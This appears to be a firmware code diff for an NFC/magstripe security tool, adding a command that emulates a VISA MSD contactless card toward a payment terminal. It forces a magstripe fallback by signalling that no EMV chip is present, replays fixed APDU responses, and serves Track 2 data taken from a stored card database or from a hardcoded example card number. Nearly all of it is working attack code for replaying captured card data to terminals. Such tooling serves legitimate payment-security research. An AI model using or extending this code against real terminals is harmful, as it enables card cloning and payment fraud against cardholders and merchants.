@@ -649,6 +649,18 @@ static bool handleCommand(const char *verb, char *args) {
     return true;
   }
 
+  // nfcvisa -- start a VISA MSD contactless emulation session against a
+  // terminal (IMPLEMENTATION_PLAN_NFC_VISA_MAGSPOOF.md Phase 3.4). Blocks the
+  // REPL for the duration of the exchange (bounded by VISA_MSD_TIMEOUT_MS).
+  if (strcmp(verb, "nfcvisa") == 0) {
+    if (!emulateVisaMSD()) {
+      Serial.println("-ERR nfcvisa failed");
+      return true;
+    }
+    Serial.println("+OK nfcvisa done");
+    return true;
+  }
+
   return false;
 }
 
@@ -687,6 +699,165 @@ bool resetNfc(bool emulation) {
   if (!ok)
     return false;
   return setSelResChip(!emulation);
+}
+
+// --- VISA MSD emulation (IMPLEMENTATION_PLAN_NFC_VISA_MAGSPOOF.md Phase 3)
+// ---------------------------------------------------------------------
+
+// Canned APDU responses for a VISA MSD contactless flow, ported verbatim from
+// hunterCatNFC_AllOne.ino:73-79 (Phase 3.1): PPSE SELECT, VISA AID SELECT and
+// GPO (processing) answers, plus the terminator response the original's
+// 6-step loop replays for its trailing two steps. `last`/`statusapdu` from
+// the source aren't kept as separate globals -- their bytes (the 0x70/0x57
+// record header and the 0x90 0x00 status word) are inlined into
+// buildVisaTrack2Record() below, which computes the record length instead of
+// assuming HunterCat's fixed 19-byte token.
+uint8_t ppsea[] = {0x6F, 0x23, 0x84, 0x0E, 0x32, 0x50, 0x41, 0x59, 0x2E, 0x53,
+                   0x59, 0x53, 0x2E, 0x44, 0x44, 0x46, 0x30, 0x31, 0xA5, 0x11,
+                   0xBF, 0x0C, 0x0E, 0x61, 0x0C, 0x4F, 0x07, 0xA0, 0x00, 0x00,
+                   0x00, 0x03, 0x10, 0x10, 0x87, 0x01, 0x01, 0x90, 0x00};
+uint8_t visaa[] = {0x6F, 0x1E, 0x84, 0x07, 0xA0, 0x00, 0x00, 0x00, 0x03,
+                   0x10, 0x10, 0xA5, 0x13, 0x50, 0x0B, 0x56, 0x49, 0x53,
+                   0x41, 0x20, 0x43, 0x52, 0x45, 0x44, 0x49, 0x54, 0x9F,
+                   0x38, 0x03, 0x9F, 0x66, 0x02, 0x90, 0x00};
+uint8_t processinga[] = {0x80, 0x06, 0x00, 0x80, 0x08,
+                         0x01, 0x01, 0x00, 0x90, 0x00};
+uint8_t finished[] = {0x6f, 0x00};
+
+// Longest READ RECORD response buildVisaTrack2Record() can produce: the 4
+// -byte "70 LL 57 LL" header + tag 0x57's EMV-standard 19-byte cap (a packed
+// PAN + separator + expiry + service code + discretionary data never exceeds
+// 19 bytes per EMV Book 3) + the 2-byte trailing status word.
+#define VISA_TRACK2_RECORD_MAX (4 + 19 + 2)
+
+// Hardcoded fallback Track 2 Equivalent Data (EMV tag 0x57), used when the
+// active card has no Track 2. Ported verbatim from hunterCatNFC_AllOne
+// .ino:69 (`token`) -- an example 4412345605781234 PAN, already packed as
+// BCD nibbles.
+static const uint8_t DEFAULT_VISA_TOKEN[19] = {
+    0x44, 0x12, 0x34, 0x56, 0x05, 0x78, 0x12, 0x34, 0xd1, 0x71,
+    0x12, 0x01, 0x00, 0x00, 0x03, 0x00, 0x00, 0x99, 0x1f};
+
+// Pack an ISO/ABA Track 2 string (";PAN=expiry+service+discretionary?", the
+// format CardDatabase stores) into EMV tag 0x57's BCD-nibble encoding: each
+// digit becomes one nibble, '=' becomes 0xD, high nibble first, and an odd
+// nibble count is padded with a trailing 0xF nibble -- the standard EMV
+// Track 2 Equivalent Data packing. Returns the packed byte count, or 0 if
+// `track2` doesn't start with ';', is empty, or is too long to fit tag
+// 0x57's 19-byte cap.
+static uint8_t packTrack2Equivalent(const char *track2, uint8_t *out,
+                                    uint8_t outCap) {
+  if (track2[0] != ';')
+    return 0;
+  uint8_t nibbles[2 * 19];
+  uint8_t n = 0;
+  for (const char *p = track2 + 1; *p != '\0' && *p != '?'; p++) {
+    uint8_t v;
+    if (*p >= '0' && *p <= '9')
+      v = *p - '0';
+    else if (*p == '=')
+      v = 0xD;
+    else
+      continue; // skip anything unexpected rather than corrupt the encoding
+    if (n >= sizeof(nibbles))
+      return 0; // too long for tag 0x57's 19-byte cap
+    nibbles[n++] = v;
+  }
+  if (n == 0)
+    return 0;
+  if (n & 1)
+    nibbles[n++] = 0xF; // pad the last nibble to a whole byte
+  uint8_t len = n / 2;
+  if (len > outCap)
+    return 0;
+  for (uint8_t i = 0; i < len; i++)
+    out[i] = (nibbles[2 * i] << 4) | nibbles[2 * i + 1];
+  return len;
+}
+
+// Build the READ RECORD response for the VISA MSD flow's step 4: the 0x70
+// record template wrapping tag 0x57 (Track 2 Equivalent Data), followed by
+// the 0x90 0x00 status word -- what hunterCatNFC_AllOne.ino:367-369 built as
+// the fixed-size `card` array, here sized to the actual Track 2 length.
+// Track 2 source (clarifying question 3): the active CardDatabase card's
+// Track 2 (tracks[1], kept in sync by loadActiveIntoRam()) if present,
+// otherwise DEFAULT_VISA_TOKEN. Returns the total record length, or 0 if it
+// wouldn't fit `out`/`outCap`.
+static uint8_t buildVisaTrack2Record(uint8_t *out, uint8_t outCap) {
+  uint8_t payload[19];
+  uint8_t payloadLen = 0;
+  if (trackPresent(2))
+    payloadLen = packTrack2Equivalent(tracks[1], payload, sizeof(payload));
+  if (payloadLen == 0) {
+    memcpy(payload, DEFAULT_VISA_TOKEN, sizeof(DEFAULT_VISA_TOKEN));
+    payloadLen = sizeof(DEFAULT_VISA_TOKEN);
+  }
+  uint8_t total = 4 + payloadLen + 2;
+  if (total > outCap)
+    return 0;
+  out[0] = 0x70;
+  out[1] = 2 + payloadLen;
+  out[2] = 0x57;
+  out[3] = payloadLen;
+  memcpy(&out[4], payload, payloadLen);
+  out[4 + payloadLen] = 0x90;
+  out[4 + payloadLen + 1] = 0x00;
+  return total;
+}
+
+// Overall wall-clock budget for one nfcvisa run: long enough to cover a slow
+// tap-and-hold across all 6 steps, short enough that a command that never
+// gets a terminal doesn't hang the REPL indefinitely.
+#define VISA_MSD_TIMEOUT_MS (15000)
+
+// Run one VISA MSD emulation session against a terminal (Phase 3.2), porting
+// hunterCatNFC_AllOne.ino:364-390 (visamsd()) onto NfcController's
+// cardReceive()/cardSend(). The original blindly replies to each of the 6
+// incoming commands in a fixed order (PPSE, VISA AID, GPO, READ RECORD, then
+// two terminator replies) without inspecting their content; that assumption
+// is kept here. Puts the PN7150 into emulation mode first (auto-applies
+// SEL_RES nochip via resetNfc(), so the terminal falls back to magstripe
+// instead of attempting EMV crypto this emulation can't satisfy).
+bool emulateVisaMSD() {
+  if (!resetNfc(true)) {
+    Serial.println("NFC: emulation mode failed");
+    return false;
+  }
+
+  uint8_t card[VISA_TRACK2_RECORD_MAX];
+  uint8_t cardLen = buildVisaTrack2Record(card, sizeof(card));
+  if (cardLen == 0) {
+    Serial.println("nfcvisa: track 2 too long to encode");
+    return false;
+  }
+
+  uint8_t *apdus2[] = {ppsea, visaa, processinga, card, finished, finished};
+  uint8_t apdusLen2[] = {sizeof(ppsea), sizeof(visaa),    sizeof(processinga),
+                         cardLen,       sizeof(finished), sizeof(finished)};
+
+  uint8_t cmdBuf[255];
+  uint8_t cmdLen;
+  const unsigned long start = millis();
+  for (uint8_t i = 0; i < 6;) {
+    if (millis() - start >= VISA_MSD_TIMEOUT_MS) {
+      Serial.println("nfcvisa: timeout waiting for terminal");
+      return false;
+    }
+    if (!nfc.cardReceive(cmdBuf, &cmdLen)) {
+      // No command arrived within cardReceive's own window: either no
+      // terminal has tapped yet, or one left mid-transaction. Re-arm
+      // listening and keep waiting for the overall deadline. cardReArm()
+      // re-runs the plain emulation bring-up (NfcController.cpp), which
+      // reverts the SEL_RES override, so it must be re-applied here.
+      if (nfc.cardReArm())
+        setSelResChip(false);
+      continue;
+    }
+    nfc.cardSend(apdus2[i], apdusLen2[i]);
+    i++;
+  }
+  Serial.println("nfcvisa: MSD emulation complete");
+  return true;
 }
 
 // BomberCat serial-control REPL (ping/info/identify) for bombercat-tools.
